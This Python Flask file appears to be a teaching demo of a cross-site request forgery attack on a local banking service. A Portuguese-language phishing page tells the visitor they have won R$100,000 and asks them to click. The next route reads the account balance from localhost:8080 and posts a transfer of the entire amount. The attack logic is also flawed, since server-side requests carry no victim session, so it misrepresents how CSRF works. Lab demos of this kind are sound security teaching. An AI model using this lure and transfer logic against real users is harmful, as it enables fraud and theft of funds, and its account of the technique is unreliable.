import requests
from flask import Flask, request, session, redirect, url_for, render_template_string

app = Flask(__name__)


@app.route('/promotion', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        return redirect(url_for('transfer'))
    return '''
        <form method="post">
            <h2>Parabéns :)! 
            <br />
            Você acabou de ganhar um prêmio de R$ 100 mil reais.</h2>            
            <input type="submit" value="Clique aqui para receber">
        </form>
    '''

# Página vulnerável a CSRF
@app.route('/transfer', methods=['GET', 'POST'])
def transfer():

    if request.method == 'GET':

        response = requests.get('http://localhost:8080/balance')
        if response.status_code == 200:
            amount = response.json()['balance']            
            response = requests.post('http://localhost:8080/transfer', {'amount': amount})
        
        return '''
            <!DOCTYPE html>
            <html>
            <body>
                <h1>Aeeeee!!!</h1>
                <h3>Confira sua conta bancária e aproveite os R$ 100 mil reais de prêmio</h3>
            </body>
            </html>
        '''

if __name__ == '__main__':
    app.run(debug=True)
